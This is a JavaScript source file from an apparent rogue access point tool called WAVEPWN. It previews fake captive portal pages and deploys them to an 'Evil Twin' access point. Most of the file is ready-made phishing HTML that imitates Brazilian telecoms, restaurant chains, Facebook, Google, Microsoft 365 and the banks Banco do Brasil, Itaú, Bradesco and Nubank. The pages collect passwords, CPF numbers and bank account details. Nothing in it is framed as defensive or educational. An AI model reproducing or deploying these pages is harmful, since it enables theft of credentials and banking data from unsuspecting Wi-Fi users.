/**
 * ═══════════════════════════════════════════════════════════════════════════
 * WAVEPWN - Captive Portal Preview (Dica 28)
 * Preview de templates de captive portal para Evil Twin
 * ═══════════════════════════════════════════════════════════════════════════
 */

const CaptivePortal = {
    templates: [],
    selectedTemplate: null
};

// Built-in Brazilian templates
const BUILTIN_TEMPLATES = [
    {
        id: 'vivo-wifi',
        name: 'Vivo WiFi',
        category: 'telecom',
        preview: generateVivoTemplate()
    },
    {
        id: 'claro-wifi',
        name: 'Claro WiFi',
        category: 'telecom',
        preview: generateClaroTemplate()
    },
    {
        id: 'tim-wifi',
        name: 'TIM WiFi',
        category: 'telecom',
        preview: generateTimTemplate()
    },
    {
        id: 'mcdonalds',
        name: 'McDonald\'s Brasil',
        category: 'restaurants',
        preview: generateMcdonaldsTemplate()
    },
    {
        id: 'starbucks',
        name: 'Starbucks',
        category: 'restaurants',
        preview: generateStarbucksTemplate()
    },
    {
        id: 'shopping',
        name: 'Shopping Center',
        category: 'retail',
        preview: generateShoppingTemplate()
    },
    {
        id: 'hotel-wifi',
        name: 'Hotel WiFi',
        category: 'hotels',
        preview: generateHotelTemplate()
    },
    {
        id: 'airport',
        name: 'Aeroporto WiFi',
        category: 'transport',
        preview: generateAirportTemplate()
    },
    {
        id: 'facebook-login',
        name: 'Facebook Login',
        category: 'social',
        preview: generateFacebookTemplate()
    },
    {
        id: 'google-wifi',
        name: 'Google WiFi',
        category: 'tech',
        preview: generateGoogleTemplate()
    },
    {
        id: 'microsoft-365',
        name: 'Microsoft 365',
        category: 'tech',
        preview: generateMicrosoftTemplate()
    },
    {
        id: 'banco-brasil',
        name: 'Banco do Brasil',
        category: 'banking',
        preview: generateBankTemplate('Banco do Brasil', '#ffcc00', '#003366')
    },
    {
        id: 'itau',
        name: 'Itaú',
        category: 'banking',
        preview: generateBankTemplate('Itaú', '#ff6600', '#003366')
    },
    {
        id: 'bradesco',
        name: 'Bradesco',
        category: 'banking',
        preview: generateBankTemplate('Bradesco', '#cc0033', '#ffffff')
    },
    {
        id: 'nubank',
        name: 'Nubank',
        category: 'banking',
        preview: generateNubankTemplate()
    }
];

/**
 * Initialize captive portal manager
 */
function initCaptivePortal() {
    CaptivePortal.templates = [...BUILTIN_TEMPLATES];
    renderTemplateGallery();
    console.log('[CaptivePortal] Initialized with', CaptivePortal.templates.length, 'templates');
}

/**
 * Render template gallery
 */
function renderTemplateGallery() {
    const container = document.getElementById('template-gallery');
    if (!container) return;

    const categories = {
        telecom: '📡 Telecom',
        restaurants: '🍔 Restaurantes',
        retail: '🛒 Varejo',
        hotels: '🏨 Hotéis',
        transport: '✈️ Transporte',
        social: '📱 Redes Sociais',
        tech: '💻 Tecnologia',
        banking: '🏦 Bancos'
    };

    let html = '<div class="template-categories">';

    Object.entries(categories).forEach(([cat, label]) => {
        const templates = CaptivePortal.templates.filter(t => t.category === cat);
        if (templates.length === 0) return;

        html += `
            <div class="template-category">
                <h4>${label}</h4>
                <div class="template-grid">
                    ${templates.map(t => `
                        <div class="template-card" onclick="selectTemplate('${t.id}')">
                            <div class="template-preview-thumb">
                                <iframe srcdoc="${escapeAttr(t.preview)}" sandbox></iframe>
                            </div>
                            <div class="template-name">${t.name}</div>
                        </div>
                    `).join('')}
                </div>
            </div>
        `;
    });

    html += '</div>';
    container.innerHTML = html;
}

/**
 * Select template for preview
 */
function selectTemplate(id) {
    const template = CaptivePortal.templates.find(t => t.id === id);
    if (!template) return;

    CaptivePortal.selectedTemplate = template;
    showTemplatePreview(template);
}

/**
 * Show full template preview
 */
function showTemplatePreview(template) {
    const modal = document.createElement('div');
    modal.className = 'template-modal';
    modal.innerHTML = `
        <div class="template-modal-content">
            <div class="template-modal-header">
                <h3>📱 ${template.name}</h3>
                <button class="btn-close" onclick="closeTemplateModal()">&times;</button>
            </div>
            <div class="template-preview-container">
                <div class="device-frame">
                    <iframe id="template-iframe" srcdoc="${escapeAttr(template.preview)}" sandbox="allow-forms"></iframe>
                </div>
            </div>
            <div class="template-modal-footer">
                <button class="btn btn-secondary" onclick="editTemplate('${template.id}')">✏️ Editar</button>
                <button class="btn btn-secondary" onclick="duplicateTemplate('${template.id}')">📋 Duplicar</button>
                <button class="btn btn-primary" onclick="deployTemplate('${template.id}')">🚀 Deploy</button>
            </div>
        </div>
    `;
    document.body.appendChild(modal);

    // Animate in
    requestAnimationFrame(() => modal.classList.add('active'));
}

/**
 * Close template modal
 */
function closeTemplateModal() {
    const modal = document.querySelector('.template-modal');
    if (modal) {
        modal.classList.remove('active');
        setTimeout(() => modal.remove(), 300);
    }
}

/**
 * Deploy template to Evil Twin
 */
async function deployTemplate(id) {
    const template = CaptivePortal.templates.find(t => t.id === id);
    if (!template) return;

    try {
        const response = await fetch('/api/eviltwin/template', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                id: template.id,
                html: template.preview
            })
        });

        if (response.ok) {
            showToast('Template deployed! Evil Twin pronto.', 'success');
            closeTemplateModal();
        } else {
            throw new Error('Deploy failed');
        }
    } catch (error) {
        showToast('Erro ao fazer deploy do template', 'error');
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// TEMPLATE GENERATORS
// ═══════════════════════════════════════════════════════════════════════════

function generateVivoTemplate() {
    return `<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: linear-gradient(135deg, #660099, #9933cc); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 40px; border-radius: 20px; max-width: 400px; width: 90%; box-shadow: 0 10px 40px rgba(0,0,0,0.3); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo span { font-size: 32px; font-weight: bold; color: #660099; }
        h2 { text-align: center; color: #333; margin-bottom: 20px; }
        input { width: 100%; padding: 15px; border: 2px solid #ddd; border-radius: 10px; margin-bottom: 15px; font-size: 16px; }
        button { width: 100%; padding: 15px; background: #660099; color: white; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; }
        button:hover { background: #7700b3; }
        .terms { text-align: center; margin-top: 15px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><span>vivo</span></div>
        <h2>WiFi Grátis</h2>
        <form>
            <input type="email" placeholder="E-mail" required>
            <input type="password" placeholder="Senha" required>
            <button type="submit">Conectar</button>
        </form>
        <p class="terms">Ao conectar, você aceita os termos de uso.</p>
    </div>
</body>
</html>`;
}

function generateClaroTemplate() {
    return `<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: linear-gradient(135deg, #cc0000, #ff3333); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 40px; border-radius: 16px; max-width: 400px; width: 90%; }
        .logo { text-align: center; margin-bottom: 30px; font-size: 36px; color: #cc0000; font-weight: bold; }
        h2 { text-align: center; color: #333; margin-bottom: 25px; }
        input { width: 100%; padding: 15px; border: 2px solid #eee; border-radius: 8px; margin-bottom: 15px; font-size: 16px; }
        button { width: 100%; padding: 15px; background: #cc0000; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">claro</div>
        <h2>Conecte-se ao WiFi Claro</h2>
        <form>
            <input type="text" placeholder="CPF ou Telefone" required>
            <input type="password" placeholder="Senha" required>
            <button type="submit">Entrar</button>
        </form>
    </div>
</body>
</html>`;
}

function generateTimTemplate() {
    return `<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: linear-gradient(135deg, #0033cc, #0066ff); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 40px; border-radius: 20px; max-width: 400px; width: 90%; }
        .logo { text-align: center; margin-bottom: 30px; font-size: 40px; color: #0033cc; font-weight: bold; }
        input { width: 100%; padding: 15px; border: 2px solid #ddd; border-radius: 10px; margin-bottom: 15px; }
        button { width: 100%; padding: 15px; background: linear-gradient(135deg, #0033cc, #0066ff); color: white; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">TIM</div>
        <form>
            <input type="tel" placeholder="Número TIM" required>
            <input type="password" placeholder="Senha Meu TIM" required>
            <button type="submit">Conectar WiFi</button>
        </form>
    </div>
</body>
</html>`;
}

function generateMcdonaldsTemplate() {
    return `<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Speedee', Arial, sans-serif; }
        body { background: #da291c; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 40px; border-radius: 20px; max-width: 400px; width: 90%; text-align: center; }
        .logo { font-size: 60px; margin-bottom: 10px; }
        h2 { color: #da291c; margin-bottom: 20px; }
        input { width: 100%; padding: 15px; border: 2px solid #eee; border-radius: 30px; margin-bottom: 15px; font-size: 16px; }
        button { width: 100%; padding: 15px; background: #ffc72c; color: #292929; border: none; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: pointer; }
        .promo { background: #ffc72c; padding: 10px; border-radius: 10px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🍟</div>
        <h2>WiFi Grátis McDonald's</h2>
        <div class="promo">🎁 Ganhe um McFlurry grátis!</div>
        <form>
            <input type="email" placeholder="Seu e-mail" required>
            <input type="text" placeholder="CPF (para o brinde)" required>
            <button type="submit">Conectar e Ganhar</button>
        </form>
    </div>
</body>
</html>`;
}

function generateStarbucksTemplate() {
    return `<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'SoDoSans', Helvetica, sans-serif; }
        body { background: #1e3932; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 40px; border-radius: 12px; max-width: 400px; width: 90%; }
        .logo { text-align: center; margin-bottom: 20px; font-size: 50px; }
        h2 { text-align: center; color: #1e3932; margin-bottom: 25px; }
        input { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 4px; margin-bottom: 15px; }
        button { width: 100%; padding: 15px; background: #00704a; color: white; border: none; border-radius: 30px; font-size: 16px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">☕</div>
        <h2>Starbucks WiFi</h2>
        <form>
            <input type="email" placeholder="E-mail Starbucks Rewards" required>
            <input type="password" placeholder="Senha" required>
            <button type="submit">Conectar</button>
        </form>
    </div>
</body>
</html>`;
}

function generateShoppingTemplate() {
    return `<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', sans-serif; }
        body { background: linear-gradient(135deg, #667eea, #764ba2); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 40px; border-radius: 20px; max-width: 400px; width: 90%; }
        h2 { text-align: center; color: #333; margin-bottom: 25px; font-size: 24px; }
        .icon { text-align: center; font-size: 50px; margin-bottom: 15px; }
        input { width: 100%; padding: 15px; border: 2px solid #eee; border-radius: 10px; margin-bottom: 15px; }
        button { width: 100%; padding: 15px; background: linear-gradient(135deg, #667eea, #764ba2); color: white; border: none; border-radius: 10px; font-size: 18px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🛍️</div>
        <h2>WiFi Shopping Center</h2>
        <form>
            <input type="email" placeholder="E-mail" required>
            <input type="text" placeholder="CPF (para promoções)" required>
            <button type="submit">Navegar Grátis</button>
        </form>
    </div>
</body>
</html>`;
}

function generateHotelTemplate() {
    return `<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Playfair Display', Georgia, serif; }
        body { background: linear-gradient(135deg, #2c3e50, #34495e); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 50px; border-radius: 10px; max-width: 400px; width: 90%; }
        h2 { text-align: center; color: #2c3e50; margin-bottom: 30px; font-weight: normal; }
        .icon { text-align: center; font-size: 40px; margin-bottom: 20px; }
        input { width: 100%; padding: 15px; border: 1px solid #ddd; margin-bottom: 15px; font-size: 16px; }
        button { width: 100%; padding: 15px; background: #2c3e50; color: white; border: none; font-size: 16px; cursor: pointer; letter-spacing: 2px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🏨</div>
        <h2>Bem-vindo ao Hotel</h2>
        <form>
            <input type="text" placeholder="Número do Quarto" required>
            <input type="text" placeholder="Sobrenome do Hóspede" required>
            <button type="submit">CONECTAR</button>
        </form>
    </div>
</body>
</html>`;
}

function generateAirportTemplate() {
    return `<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: #0055a5; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 40px; border-radius: 15px; max-width: 400px; width: 90%; }
        h2 { text-align: center; color: #0055a5; margin-bottom: 25px; }
        .icon { text-align: center; font-size: 50px; margin-bottom: 15px; }
        input { width: 100%; padding: 15px; border: 2px solid #ddd; border-radius: 8px; margin-bottom: 15px; }
        button { width: 100%; padding: 15px; background: #0055a5; color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; }
        .info { text-align: center; font-size: 12px; color: #666; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">✈️</div>
        <h2>Aeroporto WiFi Grátis</h2>
        <form>
            <input type="email" placeholder="E-mail" required>
            <input type="text" placeholder="Número do Voo (opcional)">
            <button type="submit">Conectar WiFi</button>
        </form>
        <p class="info">Velocidade limitada a 2Mbps. Premium disponível.</p>
    </div>
</body>
</html>`;
}

function generateFacebookTemplate() {
    return `<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
        body { background: #f0f2f5; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 20px; border-radius: 8px; max-width: 400px; width: 90%; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .logo { color: #1877f2; font-size: 40px; font-weight: bold; text-align: center; margin-bottom: 20px; }
        input { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 6px; margin-bottom: 12px; font-size: 17px; }
        button { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; }
        .divider { text-align: center; margin: 20px 0; color: #666; }
        .create { text-align: center; }
        .create a { color: #42b72a; font-weight: bold; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">facebook</div>
        <form>
            <input type="text" placeholder="Email ou telefone" required>
            <input type="password" placeholder="Senha" required>
            <button type="submit">Entrar</button>
        </form>
        <div class="divider">ou</div>
        <div class="create"><a href="#">Criar nova conta</a></div>
    </div>
</body>
</html>`;
}

function generateGoogleTemplate() {
    return `<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Google Sans', Roboto, Arial, sans-serif; }
        body { background: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { padding: 48px 40px; border: 1px solid #dadce0; border-radius: 8px; max-width: 450px; width: 100%; }
        .logo { display: flex; justify-content: center; margin-bottom: 16px; font-size: 24px; }
        h1 { text-align: center; font-weight: 400; font-size: 24px; margin-bottom: 8px; }
        p { text-align: center; color: #5f6368; margin-bottom: 32px; }
        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 20px; font-size: 16px; }
        input:focus { border-color: #1a73e8; outline: none; }
        button { padding: 10px 24px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 14px; cursor: pointer; float: right; }
        .forgot { color: #1a73e8; text-decoration: none; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <span style="color:#4285f4">G</span>
            <span style="color:#ea4335">o</span>
            <span style="color:#fbbc05">o</span>
            <span style="color:#4285f4">g</span>
            <span style="color:#34a853">l</span>
            <span style="color:#ea4335">e</span>
        </div>
        <h1>Fazer login</h1>
        <p>para continuar no WiFi</p>
        <form>
            <input type="email" placeholder="E-mail ou telefone" required>
            <input type="password" placeholder="Digite sua senha" required>
            <a href="#" class="forgot">Esqueceu seu e-mail?</a>
            <button type="submit">Avançar</button>
        </form>
    </div>
</body>
</html>`;
}

function generateMicrosoftTemplate() {
    return `<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: #f2f2f2; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 44px; max-width: 440px; width: 100%; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
        .logo { margin-bottom: 20px; }
        .logo span { display: inline-block; width: 21px; height: 21px; margin-right: 2px; }
        .logo span:nth-child(1) { background: #f25022; }
        .logo span:nth-child(2) { background: #7fba00; }
        .logo span:nth-child(3) { background: #00a4ef; }
        .logo span:nth-child(4) { background: #ffb900; }
        h1 { font-weight: 600; font-size: 24px; margin-bottom: 20px; }
        input { width: 100%; padding: 10px 8px; border: none; border-bottom: 1px solid #666; margin-bottom: 20px; font-size: 15px; }
        button { padding: 10px 24px; background: #0067b8; color: white; border: none; font-size: 15px; cursor: pointer; }
        .options { margin-top: 20px; font-size: 13px; }
        .options a { color: #0067b8; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <span></span><span></span><br>
            <span></span><span></span>
        </div>
        <h1>Entrar</h1>
        <form>
            <input type="email" placeholder="Email, telefone ou Skype" required>
            <button type="submit">Avançar</button>
        </form>
        <div class="options">
            <p>Sem conta? <a href="#">Crie uma!</a></p>
        </div>
    </div>
</body>
</html>`;
}

function generateBankTemplate(name, primaryColor, textColor) {
    return `<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: ${primaryColor}; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 40px; border-radius: 10px; max-width: 400px; width: 90%; }
        h2 { text-align: center; color: ${textColor}; margin-bottom: 25px; }
        .logo { text-align: center; font-size: 24px; font-weight: bold; color: ${textColor}; margin-bottom: 20px; padding: 15px; background: ${primaryColor}; border-radius: 10px; }
        input { width: 100%; padding: 15px; border: 2px solid #ddd; border-radius: 8px; margin-bottom: 15px; font-size: 16px; }
        button { width: 100%; padding: 15px; background: ${primaryColor}; color: ${textColor}; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
        .security { text-align: center; font-size: 11px; color: #666; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">${name}</div>
        <h2>Internet Banking</h2>
        <form>
            <input type="text" placeholder="Agência" required>
            <input type="text" placeholder="Conta" required>
            <input type="password" placeholder="Senha" required>
            <button type="submit">Acessar</button>
        </form>
        <p class="security">🔒 Ambiente seguro</p>
    </div>
</body>
</html>`;
}

function generateNubankTemplate() {
    return `<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Graphik', -apple-system, sans-serif; }
        body { background: #820ad1; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 40px; border-radius: 20px; max-width: 400px; width: 90%; }
        .logo { text-align: center; margin-bottom: 30px; font-size: 32px; color: #820ad1; font-weight: bold; }
        h2 { text-align: center; color: #222; margin-bottom: 25px; }
        input { width: 100%; padding: 18px; border: 2px solid #eee; border-radius: 12px; margin-bottom: 15px; font-size: 16px; }
        input:focus { border-color: #820ad1; outline: none; }
        button { width: 100%; padding: 18px; background: #820ad1; color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: 600; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Nu</div>
        <h2>Entrar no Nubank</h2>
        <form>
            <input type="text" placeholder="CPF" required>
            <input type="password" placeholder="Senha" required>
            <button type="submit">Continuar</button>
        </form>
    </div>
</body>
</html>`;
}

// Utility
function escapeAttr(str) {
    return str.replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

function showToast(msg, type) {
    if (typeof addLog === 'function') addLog(msg, type);
}

// CSS Injection
function injectCaptiveStyles() {
    if (document.getElementById('captive-styles')) return;
    const style = document.createElement('style');
    style.id = 'captive-styles';
    style.textContent = `
        .template-category { margin-bottom: 30px; }
        .template-category h4 { color: var(--primary); margin-bottom: 15px; }
        .template-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 15px; }
        .template-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: var(--border-radius); overflow: hidden; cursor: pointer; transition: all 0.2s; }
        .template-card:hover { border-color: var(--primary); transform: scale(1.02); }
        .template-preview-thumb { height: 120px; overflow: hidden; background: #f0f0f0; }
        .template-preview-thumb iframe { width: 400%; height: 400%; transform: scale(0.25); transform-origin: top left; pointer-events: none; border: none; }
        .template-name { padding: 10px; text-align: center; font-size: 0.85rem; font-weight: 600; }
        .template-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: flex; align-items: center; justify-content: center; z-index: 10000; opacity: 0; transition: opacity 0.3s; }
        .template-modal.active { opacity: 1; }
        .template-modal-content { background: var(--bg-card); border-radius: var(--border-radius); max-width: 500px; width: 95%; max-height: 90vh; overflow: auto; }
        .template-modal-header { display: flex; justify-content: space-between; align-items: center; padding: 20px; border-bottom: 1px solid var(--border-color); }
        .template-modal-header h3 { margin: 0; }
        .btn-close { background: none; border: none; font-size: 24px; color: var(--text-muted); cursor: pointer; }
        .template-preview-container { padding: 20px; display: flex; justify-content: center; }
        .device-frame { width: 280px; height: 500px; background: #000; border-radius: 30px; padding: 10px; box-shadow: 0 10px 40px rgba(0,0,0,0.3); }
        .device-frame iframe { width: 100%; height: 100%; border: none; border-radius: 20px; }
        .template-modal-footer { display: flex; gap: 10px; justify-content: flex-end; padding: 20px; border-top: 1px solid var(--border-color); }
    `;
    document.head.appendChild(style);
}

document.addEventListener('DOMContentLoaded', injectCaptiveStyles);

// Exports
window.initCaptivePortal = initCaptivePortal;
window.selectTemplate = selectTemplate;
window.closeTemplateModal = closeTemplateModal;
window.deployTemplate = deployTemplate;
